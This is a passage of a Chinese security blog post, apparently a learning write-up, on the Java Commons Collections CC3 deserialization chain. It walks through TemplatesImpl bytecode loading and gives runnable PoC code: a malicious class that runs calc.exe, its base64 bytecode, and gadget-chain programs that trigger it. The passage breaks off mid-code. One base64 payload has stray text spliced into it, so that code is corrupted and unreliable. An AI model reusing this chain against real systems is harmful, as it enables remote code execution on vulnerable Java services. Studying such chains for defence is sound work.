href="https://b1uel0n3.github.io/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/">Java类加载机制</a></p><p><a href="https://www.cnblogs.com/gaorenyusi/p/18269747">java动态加载字节码</a></p><h2 id="CC3分析"><a href="#CC3分析" class="headerlink" title="CC3分析"></a>CC3分析</h2><h3 id="TemplatesImpl类构造"><a href="#TemplatesImpl类构造" class="headerlink" title="TemplatesImpl类构造"></a>TemplatesImpl类构造</h3><h4 id="TemplatesImpl动态加载字节码"><a href="#TemplatesImpl动态加载字节码" class="headerlink" title="TemplatesImpl动态加载字节码"></a>TemplatesImpl动态加载字节码</h4><p>我们先简单回顾一下TemplatesImpl是如何加载字节码的。</p><p>Java程序编译和执行流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.java 源码 → javac 编译 → .class 字节码 → JVM 加载并执行</span><br></pre></td></tr></table></figure><p>Java字节码指的是JVM执行使用的一类指令，格式为二进制文件，通常被储存在<code>.class</code>文件中</p><p>在类加载中我们知道Java加载都需要经过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.loadClass -&gt; ClassLoader.findClass -&gt; ClassLoader.defineClass</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><strong>loadClass的作用是从已经加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下，执行findClass</strong></li><li><strong>findClass的作用就是根据基础URL制定的方式来查找类，读取字节码后交给defineClass</strong></li><li><strong>defineClass的作用是处理前面传入的字节码，将其处理成真正的类</strong></li></ul><p>defineClass决定如何将一段字节流转换变成一个Java类，而在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类中定义了一个内部类<code>TransletClassLoader</code>，该类继承了ClassLoader，同时重写了defineClass方法：<br><img src="/archives/36318858/image-20250629203904232-17524572641621.png" alt="image-20250629203904232"></p><p><img src="/archives/36318858/image-20250629203926032-17524572641622.png" alt="image-20250629203926032"></p><p>其中我们可以向该方法传入恶意的字节码来执行，但其中有个问题就是该方法前面并没有标作用域，即默认为defalt：</p><p><img src="/archives/36318858/image-20250629204534545-17524572641633.png" alt="image-20250629204534545"></p><p>而ClassLoader.defineClass默认为protected，即是不能被外部类调用的，所以需要找一个内部类来调用该方法，恰好Templatealmp类中的defineTransletClasses方法调用的defineClass:</p><p><img src="/archives/36318858/image-20250629205455390-17524572641634.png" alt="image-20250629205455390"></p><p><img src="/archives/36318858/image-20250629204900907-17524572641635.png" alt="image-20250629204900907"></p><p>_bytecodes为我们要传入的恶意字节码，我们可以用反射来进行修改，注意defineTransletClasses内部还会执行一个run方法：<br><img src="/archives/36318858/image-20250629205713796-17524572641636.png" alt="image-20250629205713796"></p><p>该方法会创建一个TransletClassLoader对象，而_tfactory需要是一个TransformerFactoryImpl，不能为空。</p><p>由于是private类型，在内部类搜索defineTransletClasses，找到TemplatesImpl.getTransletInstance方法：<br><img src="/archives/36318858/image-20250629210504336-17524572641637.png" alt="image-20250629210504336"></p><p>该方法调用了defineTransletClasses方法，前提是<code>_name</code>不为null且<code>_class</code>为null。</p><p>再搜索getTransletInstance，找到TemplatesImpl.newTransformer方法：</p><p><img src="/archives/36318858/image-20250629211001149-17524572641638.png" alt="image-20250629211001149"></p><p>可以看到该方法调用了getTransletInstance方法，且作用域是public能直接调用，所以利用链也就找到了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl -&gt; newTransformer()</span><br><span class="line">TemplatesImpl -&gt; getTransletInstance()</span><br><span class="line">TemplatesImpl -&gt; defineTransletClasses()</span><br><span class="line">TemplatesImpl -&gt; defineClass()</span><br></pre></td></tr></table></figure><p>结合前面满足的条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_name != null</span><br><span class="line">_class == null</span><br><span class="line">_tfactory = new TransformerFactoryImpl()</span><br><span class="line">_bytecodes = 恶意字节码</span><br></pre></td></tr></table></figure><p>这些条件完全可以通过反射来修改，先构造恶意的字节码：</p><p>evil.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先进行编译，然后将.class文件进行base64编码读取：</p><p><img src="/archives/36318858/image-20250629212855055-17524572641639.png" alt="image-20250629212855055"></p><p><img src="/archives/36318858/image-20250629214314920-175245726416310.png" alt="image-20250629214314920"></p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAGgwAGwAcAQAIY2FsYy5leGUMAB0AHgEABGV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAEAAQABQANAAYACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Impl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250629215506535-175245726416311.png" alt="image-20250629215506535"></p><p>可是报错并且没有弹计算机，看了师傅的文章才知道<code>TemplatesImpl</code>中对加载的字节码是有一定要求的，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p><p>所以我们修改代码：</p><p>evil.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新得到字节码：</p><p><img src="/archives/36318858/image-20250629220933035-175245726416312.png" alt="image-20250629220933035"></p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Impl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250629221331457-175245726416313.png" alt="image-20250629221331457"></p><p>虽然报错但也成功弹计算机了。</p><h4 id="CC1环境下"><a href="#CC1环境下" class="headerlink" title="CC1环境下"></a>CC1环境下</h4><p>其实CC3简单点说就是将链子后半部分利用危险方法的方式变了。CC1是通过获取Runtime对象执行exec方法，而CC3是通过TemplatesImpl动态加载字节码来执行恶意命令。</p><p>所以修改下后半段poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAzheyangMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        ConstantTransformer Im=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl);</span><br><span class="line">        InvokerTransformer newTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Im,newTransformer&#125;;</span><br><span class="line">        </span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将poc剩下部分抄上去：</p><p>CC3（TransfomedMap）完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span 